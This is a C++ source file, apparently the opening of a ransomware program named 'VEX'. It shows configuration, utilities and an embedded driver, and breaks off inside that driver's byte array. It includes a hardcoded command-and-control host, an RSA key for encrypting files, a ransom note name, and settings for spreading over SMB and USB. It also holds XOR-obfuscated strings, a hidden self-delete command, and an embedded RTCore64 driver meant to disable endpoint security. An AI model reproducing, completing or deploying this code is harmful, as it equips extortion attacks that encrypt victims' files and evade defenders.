#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <bcrypt.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <lm.h>
#include <winnetwk.h>
#include <wtsapi32.h>
#include <psapi.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <vector>
#include <string>
#include <fstream>
#include <atomic>
#include <iostream>
#include <algorithm>
#include <unordered_set>
#include <unordered_map>
#include <deque>
#include <map>
#include <cstdlib>
#include <cstring>
#include <cwctype>
#include <cstdio>
#include <exception>
#include <winioctl.h>
#include <dbt.h>
#include <ntddstor.h>
#include <wbemidl.h>
#include <tlhelp32.h>
#include <aclapi.h>
#include <sddl.h>
#include <dpapi.h>
#include <ctime>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "vssapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wbemuuid.lib")

#if __has_include("campaign_config.h")
#include "campaign_config.h"
#endif

// ============================================================================
// 1. GLOBAL CONFIGURATION
// ============================================================================
namespace vex {
    namespace config {
        constexpr bool kEnableLateralMovement = true;
        // Detonation only touches SMB shares when this is explicitly true.
        // Small operations and VM dry runs leave it false.
        constexpr bool kEncryptNetworkShares = false;
        inline bool g_disableShares = false;
        inline bool g_disableUsb = false;
        inline bool g_sleepCrypt = false;
        inline std::wstring g_wipeJournalOverride;
        inline bool g_wipeTestMode = false;
        constexpr bool kEnableBYOVD = true;
        constexpr uint32_t kMaxThreads = 16;
        constexpr size_t kRsaBytes = 256;
        constexpr size_t kAesKeyBytes = 32;

        inline const uint8_t kRsaPubMod[256] = {
    0x53, 0xF8, 0xA5, 0x37, 0x42, 0x6E, 0x67, 0x3C, 0x5F, 0xF4, 0x02, 0x48, 0x43, 0xF7, 0x22, 0x8A,
    0x71, 0x25, 0x96, 0xD0, 0x2A, 0x41, 0xD0, 0xF3, 0xED, 0xBA, 0x57, 0xCB, 0x4E, 0x72, 0x0B, 0x19,
    0xCB, 0xA4, 0xCA, 0xB2, 0x43, 0x79, 0xC6, 0xEA, 0xCA, 0xAA, 0xAA, 0xCA, 0x4A, 0x44, 0x60, 0x6B,
    0xB4, 0x93, 0x9D, 0x84, 0xAD, 0xE0, 0x21, 0x79, 0x4B, 0x1E, 0x81, 0x76, 0x31, 0xAA, 0x70, 0xCA,
    0x53, 0x78, 0xC0, 0x34, 0xF0, 0x1C, 0x2E, 0x03, 0x54, 0xE4, 0xF1, 0xAA, 0x83, 0xB4, 0x56, 0xEC,
    0xE5, 0xC3, 0xE1, 0x5C, 0xFD, 0x88, 0x2B, 0x04, 0xA2, 0x47, 0xA3, 0x04, 0xB9, 0xAE, 0x4E, 0x82,
    0xDF, 0x00, 0xE4, 0x51, 0xEB, 0x98, 0x30, 0xB4, 0x9F, 0xE9, 0xDA, 0xBC, 0x8C, 0x43, 0xD1, 0x9B,
    0x2B, 0x69, 0x54, 0xC1, 0x68, 0xF5, 0xFE, 0x23, 0xAC, 0xE1, 0x9A, 0x32, 0x0E, 0x85, 0x9D, 0x59,
    0xA3, 0xBC, 0x84, 0x3E, 0xAB, 0x2A, 0x04, 0x5E, 0xC5, 0x55, 0x47, 0x8B, 0x37, 0xDD, 0x90, 0xCB,
    0x96, 0x18, 0xC9, 0x03, 0xE2, 0x54, 0xD2, 0x9F, 0x74, 0x62, 0x1B, 0xAE, 0x8B, 0x77, 0x98, 0xB3,
    0x45, 0x71, 0xB6, 0xF0, 0x99, 0xC0, 0xBC, 0x39, 0x85, 0xAE, 0xC7, 0x59, 0xED, 0xF6, 0x16, 0x66,
    0x56, 0x91, 0x0C, 0xA2, 0xC4, 0x1E, 0xBB, 0xB3, 0xFF, 0xCC, 0x69, 0x78, 0x65, 0x07, 0x93, 0x47,
    0xF0, 0x08, 0xE3, 0x99, 0x00, 0xBF, 0xFC, 0xB3, 0x97, 0xEC, 0x38, 0x7B, 0x29, 0x56, 0x99, 0x83,
    0xE4, 0x82, 0x40, 0xA7, 0xC5, 0xD7, 0xF6, 0x7C, 0x01, 0x76, 0xDB, 0x59, 0xAD, 0xCB, 0x3A, 0x2A,
    0xB5, 0x95, 0x02, 0xFE, 0xB9, 0xC6, 0x1C, 0x81, 0x7E, 0xBE, 0xB0, 0x37, 0x52, 0x56, 0xDB, 0x98,
    0xB3, 0x41, 0xD2, 0x06, 0x75, 0xFE, 0x14, 0x8F, 0x5A, 0x0C, 0xF8, 0x09, 0xB1, 0xC4, 0xAE, 0x93,
        };

#ifdef VEX_CAMPAIGN_HOST
        inline const std::wstring kC2Host = VEX_CAMPAIGN_HOST;
#else
        inline const std::wstring kC2Host = L"placidly-anteater-recolor.ngrok-free.dev";
#endif

        // Fallback endpoints, tried in order when the primary is unreachable.
        // Empty strings are ignored. A C2 can also push a new host on ping,
        // which is persisted and becomes the first entry at runtime.
        inline const std::wstring kC2Fallbacks[2] = { L"", L"" };
        inline const std::wstring kC2HostFileRelative = L"\\VEX\\c2h";

        // Shared API token. Empty on the panel disables the check; when both
        // sides carry the same value, fake checkins are rejected.
#ifdef VEX_CAMPAIGN_TOKEN
        inline const std::wstring kApiToken = VEX_CAMPAIGN_TOKEN;
#else
        // No shipping default: token mode requires a campaign build. An empty
        // token is only valid when the panel also has api_token disabled.
        inline const std::wstring kApiToken = L"";
#endif
        inline constexpr uint16_t kC2Port = 443;
        inline const std::wstring kC2Path = L"/api/checkin";
        inline const std::wstring kC2PingPath = L"/api/ping";
        inline const std::wstring kC2ReportPath = L"/api/report";
        inline const std::wstring kPardonPath = L"/api/pardon_exe";
        inline const std::wstring kPortalPath = L"/portal";

        // OPSEC: no tell-tale names in paths. Encrypted files keep their
        // original extension; the journal looks like a system temp file.
        inline const std::wstring kJournalName = L"~DF3A9.tmp";
        inline const std::wstring kNoteName = L"HOW_TO_RESTORE_FILES.txt";

        // Sleeper timing. The payload pings the C2 on this cadence while dormant.
        // Jitter is added so a fleet of beacons never checks in on the same tick.
        inline constexpr uint32_t kPingIntervalMs = 5u * 60u * 1000u; // 5 minutes
        inline constexpr uint32_t kPingJitterMs = 60u * 1000u;        // up to 1 min

        // Registration retries: every 10 min (+jitter) for 24 hours.
        inline constexpr uint32_t kBeaconRetryMs = 10u * 60u * 1000u;
        inline constexpr uint32_t kBeaconRetryWindowMs = 24u * 60u * 60u * 1000u;

        // Apex behaviour.
        inline constexpr uint16_t kSmbPort = 445;
        inline constexpr uint32_t kSmbConnectTimeoutMs = 700;
        inline constexpr uint32_t kSmbMaxHostsPerSubnet = 254;
        inline constexpr uint32_t kSpreadRescanMs = 6u * 60u * 60u * 1000u; // 6 hours
        inline constexpr uint32_t kUsbPollMs = 2000;
        inline constexpr uint32_t kSpreadMaxHosts = 64;
        inline constexpr int kSpreadHistoryDays = 7;
        inline constexpr bool kSpreadStagedDelivery = true;
        inline constexpr uint32_t kSpreadWorkers = 16;
        inline constexpr uint32_t kSpreadJitterMs = 800;
        inline const std::wstring kUsbMarker = L".vx_id";
        // Deny-list applied before probing. Empty allow-list means "all".
        inline const std::vector<std::string> kSpreadAllowCidrs = {};
        inline const std::vector<std::string> kSpreadDenyCidrs = { "127.0.0.0/8" };
        // Optional credential pairs for lateral movement. Empty = current token.
        // Edit these for an engagement; they are never written to disk.
        inline const std::vector<std::pair<std::wstring, std::wstring>> kSpreadCreds = {};

        // Engine 2.0
        inline constexpr uint64_t kIntermittentThreshold = 100ull * 1024 * 1024;
        inline constexpr uint64_t kIntermittentBudgetChunks = 160; // ~10 MiB of AES per big file
        inline constexpr uint32_t kShareBudgetHosts = 32;
        inline constexpr uint32_t kPriorityWalkBudgetMs = 120000;

        // FALSE: detonation walks every fixed drive. The harness still accepts
        // an explicit --encrypt root for scoped tests.
        inline constexpr bool kEncryptOnlyTestRoot = false;
        inline const std::wstring kTestRoot = L"C:\\TestTarget";
    } // namespace config
} // namespace vex

// ============================================================================
// 2. UTILITIES
// ============================================================================
namespace vex {
    namespace utils {
        template<size_t N>
        struct ObfStr {
            char data[N];
            constexpr ObfStr(const char(&s)[N]) : data{} {
                for (size_t i = 0; i < N; i++) data[i] = s[i] ^ 0x5A;
            }
            std::string get() const {
                std::string s(data, N - 1);
                for (auto& c : s) c ^= 0x5A;
                return s;
            }
        };

// Obfuscated literal helper: X("text") returns the decoded std::string.
#define X(s) ([]() { static constexpr auto _o = vex::utils::ObfStr<sizeof(s)>{s}; std::string _r(_o.data, sizeof(s) - 1); for (auto& _c : _r) _c ^= 0x5A; return _r; }())

        static std::wstring widen(const std::string& s) {
            if (s.empty()) return L"";
            int sz = MultiByteToWideChar(CP_UTF8, 0, &s[0], (int)s.size(), NULL, 0);
            if (sz <= 0) return L"";
            std::wstring ws(sz, 0);
            MultiByteToWideChar(CP_UTF8, 0, &s[0], (int)s.size(), &ws[0], sz);
            return ws;
        }

        static std::string narrow(const std::wstring& ws) {
            if (ws.empty()) return "";
            int sz = WideCharToMultiByte(CP_UTF8, 0, &ws[0], (int)ws.size(), NULL, 0, NULL, NULL);
            if (sz <= 0) return "";
            std::string s(sz, 0);
            WideCharToMultiByte(CP_UTF8, 0, &ws[0], (int)ws.size(), &s[0], sz, NULL, NULL);
            return s;
        }

        static std::string b64(const uint8_t* data, size_t len) {
            static const char* tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            std::string out; out.reserve(((len + 2) / 3) * 4);
            for (size_t i = 0; i < len; i += 3) {
                uint32_t v = data[i] << 16;
                if (i + 1 < len) v |= data[i + 1] << 8;
                if (i + 2 < len) v |= data[i + 2];
                out.push_back(tbl[(v >> 18) & 0x3F]); out.push_back(tbl[(v >> 12) & 0x3F]);
                out.push_back((i + 1 < len) ? tbl[(v >> 6) & 0x3F] : '=');
                out.push_back((i + 2 < len) ? tbl[v & 0x3F] : '=');
            }
            return out;
        }

        // Standard base64 decode; ignores whitespace and invalid characters.
        static std::vector<uint8_t> unb64(const std::string& in) {
            static int tbl[256];
            static bool init = false;
            if (!init) {
                for (int i = 0; i < 256; i++) tbl[i] = -1;
                const char* c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                for (int i = 0; i < 64; i++) tbl[(uint8_t)c[i]] = i;
                init = true;
            }
            std::vector<uint8_t> out;
            out.reserve(in.size() * 3 / 4 + 4);
            uint32_t v = 0;
            int bits = -8;
            for (unsigned char ch : in) {
                if (tbl[ch] < 0) continue;
                v = (v << 6) | (uint32_t)tbl[ch];
                bits += 6;
                if (bits >= 0) { out.push_back((uint8_t)((v >> bits) & 0xFF)); bits -= 8; }
            }
            return out;
        }

        static bool WriteExact(HANDLE h, const void* src, DWORD n) {
            const uint8_t* p = (const uint8_t*)src;
            DWORD remaining = n;
            while (remaining > 0) {
                DWORD written = 0;
                if (!WriteFile(h, p, remaining, &written, NULL)) return false;
                if (written == 0) return false;
                p += written;
                remaining -= written;
            }
            return true;
        }

        static std::string EscapeJournalPath(const std::wstring& w) {
            std::string s = narrow(w);
            std::string out;
            out.reserve(s.size() + 16);
            for (char c : s) {
                if (c == '\\') { out.push_back('\\'); out.push_back('\\'); }
                else if (c == '|') { out.push_back('\\'); out.push_back('|'); }
                else out.push_back(c);
            }
            return out;
        }

        static std::string UrlEncode(const std::string& s) {
            static const char* hex = "0123456789ABCDEF";
            std::string o;
            o.reserve(s.size() + 8);
            for (unsigned char c : s) {
                if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                    (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
                    o.push_back((char)c);
                }
                else {
                    o.push_back('%');
                    o.push_back(hex[c >> 4]);
                    o.push_back(hex[c & 0xF]);
                }
            }
            return o;
        }

        static std::wstring ExpandEnv(const std::wstring& in) {
            wchar_t buf[1024];
            DWORD n = ExpandEnvironmentStringsW(in.c_str(), buf, 1024);
            if (n == 0 || n > 1024) return in;
            return std::wstring(buf);
        }

        // \\?\ form for Win32 calls: bypasses MAX_PATH and normalisation.
        static std::wstring extended(const std::wstring& p) {
            if (p.rfind(L"\\\\?\\", 0) == 0) return p;
            if (p.rfind(L"\\\\", 0) == 0) return L"\\\\?\\UNC\\" + p.substr(2);
            return L"\\\\?\\" + p;
        }

        // Canonical form for the journal (what the decrypter expects).
        static std::wstring canonical(const std::wstring& p) {
            if (p.rfind(L"\\\\?\\UNC\\", 0) == 0) return L"\\\\" + p.substr(8);
            if (p.rfind(L"\\\\?\\", 0) == 0) return p.substr(4);
            return p;
        }

        // Journal location: a system-looking temp name, in the user's local
        // temp when available, otherwise a machine-wide temp that a SYSTEM
        // service can also write and the victim's decrypter can read.
        static std::wstring DefaultJournalPath() {
            wchar_t buf[1024]{};
            DWORD n = GetEnvironmentVariableW(L"LOCALAPPDATA", buf, 1024);
            if (n > 0 && n < 1024) {
                std::wstring p = std::wstring(buf) + L"\\Temp";
                if (GetFileAttributesW(p.c_str()) != INVALID_FILE_ATTRIBUTES)
                    return p + L"\\" + config::kJournalName;
            }
            n = GetEnvironmentVariableW(L"TEMP", buf, 1024);
            if (n > 0 && n < 1024) {
                std::wstring p = buf;
                if (GetFileAttributesW(p.c_str()) != INVALID_FILE_ATTRIBUTES)
                    return p + L"\\" + config::kJournalName;
            }
            wchar_t win[MAX_PATH]{};
            if (GetWindowsDirectoryW(win, MAX_PATH))
                return std::wstring(win) + L"\\Temp\\" + config::kJournalName;
            return L"C:\\" + config::kJournalName;
        }

        static std::wstring CommandLineTail() {
            const wchar_t* p = GetCommandLineW();
            if (!p) return L"";
            if (*p == L'"') {
                p++;
                while (*p && *p != L'"') p++;
                if (*p == L'"') p++;
            } else {
                while (*p && *p != L' ') p++;
            }
            while (*p == L' ' || *p == L'\t') p++;
            return std::wstring(p);
        }

        static std::wstring SelfPath() {
            wchar_t self[MAX_PATH]{};
            GetModuleFileNameW(NULL, self, MAX_PATH);
            return std::wstring(self);
        }

        // Cheap non-crypto randomness for file/service names. The value only has
        // to be unique on the target, never unpredictable.
        static uint32_t NextSeed() {
            static std::atomic<uint32_t> counter{ 0 };
            uint32_t v = (uint32_t)GetTickCount64()
                ^ ((uint32_t)GetCurrentProcessId() << 16)
                ^ (++counter * 2654435761u);
            v ^= v >> 13; v *= 0x5bd1e995u; v ^= v >> 15;
            return v;
        }

        static std::wstring RandomHex(size_t chars) {
            static const wchar_t* hex = L"0123456789abcdef";
            std::wstring s;
            s.reserve(chars);
            for (size_t i = 0; i < chars; i++) {
                if (i % 8 == 0) NextSeed();
                s.push_back(hex[NextSeed() & 0xF]);
            }
            return s;
        }

        static void Hide(const std::wstring& path) {
            SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }

        static bool WriteUtf8(const std::wstring& path, const std::string& data) {
            HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;
            bool ok = WriteExact(h, data.data(), (DWORD)data.size());
            CloseHandle(h);
            return ok;
        }

        // Spawns a hidden cmd that deletes this executable after the process exits.
        static void SelfDelete() {
            std::wstring cmd = widen(X("cmd.exe /c ping 127.0.0.1 -n 3 >nul & del /f /q \""))
                + SelfPath() + L"\"";
            STARTUPINFOW si{}; si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi{};
            std::wstring c = cmd;
            if (CreateProcessW(NULL, &c[0], NULL, NULL, FALSE, CREATE_NO_WINDOW,
                NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
        }

        static bool RunHidden(const std::wstring& cmd, DWORD waitMs,
            DWORD* exitCode = nullptr) {
            STARTUPINFOW si{}; si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi{};
            std::wstring c = cmd;
            bool done = false;
            if (CreateProcessW(NULL, &c[0], NULL, NULL, FALSE, CREATE_NO_WINDOW,
                NULL, NULL, &si, &pi)) {
                if (waitMs) done = WaitForSingleObject(pi.hProcess, waitMs) == WAIT_OBJECT_0;
                if (exitCode) {
                    DWORD rc = 1;
                    if (done) GetExitCodeProcess(pi.hProcess, &rc);
                    *exitCode = rc;
                }
                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            }
            return done && (!exitCode || *exitCode == 0);
        }

        // Killing the victim's Office/DB processes and loading a kernel driver
        // both need privileges a plain admin token does not enable by default.
        // Restrict the VEX state directory to SYSTEM + Administrators. Without
        // this, any local user can read state.bin/secret on default ProgramData
        // ACLs and sign as the victim or recover the key.
        static bool ProtectStatePath(const std::wstring& path) {
            PSECURITY_DESCRIPTOR sd = nullptr;
            if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
                L"D:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)", SDDL_REVISION_1,
                &sd, nullptr))
                return false;
            BOOL present = FALSE, defaulted = FALSE;
            PACL dacl = nullptr;
            bool ok = GetSecurityDescriptorDacl(sd, &present, &dacl, &defaulted) &&
                present && dacl;
            if (ok) {
                ok = SetNamedSecurityInfoW((LPWSTR)path.c_str(), SE_FILE_OBJECT,
                    DACL_SECURITY_INFORMATION, nullptr, nullptr, dacl, nullptr)
                    == ERROR_SUCCESS;
            }
            LocalFree(sd);
            return ok;
        }

        static bool EnablePrivilege(const wchar_t* name) {
            HANDLE tok = NULL;
            if (!OpenProcessToken(GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return false;

            LUID luid{};
            bool ok = LookupPrivilegeValueW(NULL, name, &luid) != FALSE;
            if (ok) {
                TOKEN_PRIVILEGES tp{};
                tp.PrivilegeCount = 1;
                tp.Privileges[0].Luid = luid;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL) != FALSE
                    && GetLastError() == ERROR_SUCCESS;
            }
            CloseHandle(tok);
            return ok;
        }
    } // namespace utils
} // namespace vex

// ============================================================================
// 3. EVASION & EDR KILLER (BYOVD)
// ============================================================================
namespace vex {
    namespace evasion {
        // BYOVD extension point: a different driver needs its own blob here,
        // the device name in DropAndLoadDriver, and matching IOCTL/offset
        // values below. The pre-flight gate and the reported status are
        // driver-agnostic.
        unsigned char kRTCore64[14648] = {
            0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
  0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd8, 0x00, 0x00, 0x00,
  0x0e, 0x1f, 0xba, 0x0e, 0x00, 0xb4, 0x09, 0xcd, 0x21, 0xb8, 0x01, 0x4c, 0xcd, 0x21, 0x54, 0x68,
  0x69, 0x73, 0x20, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x20, 0x63, 0x61, 0x6e, 0x6e, 0x6f,
  0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6e, 0x20, 0x69, 0x6e, 0x20, 0x44, 0x4f, 0x53, 0x20,
  0x6d, 0x6f, 0x64, 0x65, 0x2e, 0x0d, 0x0d, 0x0a, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xef, 0x48, 0x38, 0x9d, 0xab, 0x29, 0x56, 0xce, 0xab, 0x29, 0x56, 0xce, 0xab, 0x29, 0x56, 0xce,
  0xd0, 0x0a, 0x4f, 0xce, 0xa9, 0x29, 0x56, 0xce, 0xab, 0x29, 0x57, 0xce, 0xa5, 0x29, 0x56, 0xce,
  0x34, 0x21, 0x2d, 0xce, 0xa8, 0x29, 0x56, 0xce, 0x1f, 0x21, 0x3b, 0xce, 0xaa, 0x29, 0x56, 0xce,
  0x34, 0x21, 0x2e, 0xce, 0xaa, 0x29, 0x56, 0xce, 0x52, 0x69, 0x63, 0x68, 0xab, 0x29, 0x56, 0xce,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x05, 0x00,
  0x90, 0x1d, 0x94, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x2e, 0x01,
  0x0b, 0x02, 0x08, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xd0, 0x1b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x05, 0x00, 0x02, 0x00,
  0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
  0xc9, 0xa4, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x3c, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00,
  0x00, 0x1c, 0x00, 0x00, 0x38, 0x1d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x20, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x2e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x74, 0x0c, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x00, 0x0e, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
  0x30, 0x01, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
  0x2e, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00,
  0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xc8, 0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
  0x60, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
  0x49, 0x4e, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,
  0x00, 0x04, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0xe2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x89, 0x4c, 0x24, 0x08, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x83, 0x78,
